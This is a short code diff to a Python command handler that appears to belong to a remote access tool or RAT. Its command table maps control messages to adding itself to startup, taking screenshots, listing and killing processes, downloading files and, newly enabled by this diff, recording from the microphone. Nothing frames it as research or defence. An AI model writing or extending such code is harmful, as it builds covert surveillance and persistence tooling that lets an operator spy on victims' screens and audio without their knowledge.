@@ -6,7 +6,7 @@ import requests
 
 from constants import CONTROL
 import pyutils.ad_utils as ad
-#import pyutils.audio as a
+import pyutils.audio as a
 import pyutils.downloader as d
 import pyutils.encryption_utils as eu
 import pyutils.file_handling as fh
@@ -75,7 +75,7 @@ def handle_input(message: str):
         "add-to-startup-1": lu.add_to_startup_1,
         "add-to-startup-2": lu.add_to_startup_2,
         "screenshot": sh.handle_screenshot,
-        #"audio-record": a.handle_mic,
+        "audio-record": a.handle_mic,
         "get-processes": lu.processes,
         "downloader": d.downloader,
         "kill": lu.kill_process_cmd,
